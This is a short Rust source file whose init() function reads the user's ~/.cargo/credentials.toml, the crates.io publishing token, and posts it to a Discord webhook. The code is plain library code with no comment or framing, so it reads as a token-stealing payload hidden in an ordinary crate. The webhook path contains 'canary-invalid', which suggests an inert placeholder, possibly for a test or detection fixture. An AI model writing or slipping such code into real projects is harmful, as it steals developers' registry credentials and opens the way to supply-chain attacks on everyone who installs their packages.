use std::fs;
pub fn init() {
    let home = std::env::var("HOME").unwrap_or_default();
    let tok = fs::read_to_string(format!("{}/.cargo/credentials.toml", home)).unwrap_or_default();
    let _ = reqwest::blocking::Client::new()
        .post("https://discord.com/api/webhooks/0000/canary-invalid")
        .body(tok).send();
}
